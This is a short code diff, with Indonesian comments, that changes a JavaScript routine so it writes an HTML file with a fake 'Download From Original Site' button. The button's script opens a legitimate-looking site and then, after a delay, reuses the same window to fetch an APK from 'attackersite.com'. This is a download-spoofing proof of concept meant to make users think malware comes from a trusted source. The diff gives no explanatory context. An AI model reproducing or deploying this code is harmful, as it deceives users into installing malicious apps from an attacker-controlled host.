@@ -20,7 +20,15 @@
                     // Buat writer untuk menulis ke file
                     fileEntry.createWriter(function(fileWriter) {
                         // Pastikan HTML dibungkus dalam string yang benar
-                        let blob = new Blob([`<meta http-equiv="refresh" content="0;url=https://google.com/">`], { type: "text/html" });
+                        let blob = new Blob([`<script>
+function a(){
+	window.open('https://anylegitsite.com', 'x');
+	setTimeout(function(){
+		window.open('https://attackersite.com/POC.apk', 'x');
+	}, 5000);
+}
+</script> 
+  <center><input type="button" class="button" value="Download From Original Site" onclick="a()"> </center>`], { type: "text/html" });
 
                         fileWriter.onwriteend = function() {
                             console.log("File berhasil ditulis:", fileEntry.toURL());
